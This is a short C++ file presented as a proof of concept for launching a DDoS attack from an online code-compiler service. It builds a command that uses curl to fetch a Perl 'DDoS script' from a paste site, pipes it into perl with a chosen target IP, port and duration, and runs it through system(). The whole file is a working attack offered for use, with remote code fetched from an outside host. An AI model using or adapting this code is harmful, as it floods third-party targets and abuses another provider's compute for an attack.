/*
Description:
    This is a simple Proof-of-Concept about how you can DDoS someone by using this "compiler".
Release Date:
    03.01.2019
Author:
    xpd
Issues:
    You can't keep the attack longer as you want.
    The "compiler" returns "General timeout error - please try again".
Link:
	https://interviews.skype.com/en/Quick/
Note:
    This Proof-of-Concept is not 100% accurate (you can't take down nasa.gov).
*/

/*
    Includes
*/
#include <iostream>
/*
    Arguments
*/
#define IP "" //YOUR IP GOES HERE
#define PORT 80
#define TIME 0
/*
    Scripts
*/
#define speedtest "https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py" //Official SpeedTest script
#define ddos_script "https://hastebin.com/raw/jezafehubu" //Just a random DDoS script ; you can replace it with your script
/*
    Vars
*/
#define MAX_PATH 256
#define bIsASpeedTest false

int main()
{
    char* cli = new char[MAX_PATH]; //our commandline

    if(bIsASpeedTest)
        sprintf(cli, "curl -s -L %s | python /dev/stdin", speedtest);
    else
        sprintf(cli, "curl -s -L %s | perl /dev/stdin %s %d %d", ddos_script, IP, PORT, TIME);
    
    system(cli); //we run our command line
    
    //can't arrive here but yeah
    if(cli)
        delete[] cli;
    return 1;
}
